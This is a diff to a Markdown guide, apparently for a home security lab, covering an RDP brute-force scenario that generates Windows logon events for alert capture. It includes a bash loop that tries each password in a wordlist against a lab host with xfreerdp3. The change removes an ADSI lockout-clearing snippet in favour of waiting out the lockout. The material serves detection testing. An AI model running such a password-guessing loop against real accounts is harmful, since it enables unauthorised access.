@@ -226,22 +226,19 @@ credential check only (a Type-3 logon), so each wrong password is a clean 4625:
 ```bash
 mkdir -p evidence/scenario-04-rdp
 for pass in $(cat ~/winpass.txt); do
-  echo "=== Trying: $pass ==="
   xfreerdp3 /u:Client /p:"$pass" /v:192.168.56.30 /cert:ignore +auth-only
 done 2>&1 | tee evidence/scenario-04-rdp/attack-output.txt
 ```
 
-**Attack, part 2 — clear the lockout, then open a REAL session (Windows / Kali).**
+**Attack, part 2 — wait out the lockout, then open a REAL session (Kali).**
 The lockout stops the loop (every further try, even the correct one, returns
-`ACCOUNT_LOCKED_OUT`). Policy is 10/10/10, so in the wild you wait 10 min; in the lab
-clear it with ADSI, then RDP in interactively with the known-good password:
-```powershell
-# On Windows: clear the lockout (net user does NOT clear it — use ADSI)
-$u = [ADSI]"WinNT://$env:COMPUTERNAME/Client,user"; $u.IsAccountLocked = $false; $u.SetInfo()
-```
+`ACCOUNT_LOCKED_OUT`). Policy is `net accounts` 10/10/10, so the lockout
+**auto-expires after ~10 minutes** with no admin unlock — this run waited it out,
+then logged in interactively with a valid credential (obtained out-of-band; here the
+account's own password):
 ```bash
 # On Kali: a real interactive RDP session (no +auth-only) → Type-10 logon
-xfreerdp3 /u:Client /p:"<known-good>" /v:192.168.56.30 /cert:ignore -clipboard
+xfreerdp3 /u:Client /p:"<valid-password>" /v:192.168.56.30 /cert:ignore
 ```
 
 **Capture the alerts (manager).** The successful RDP login records two 4624s — a
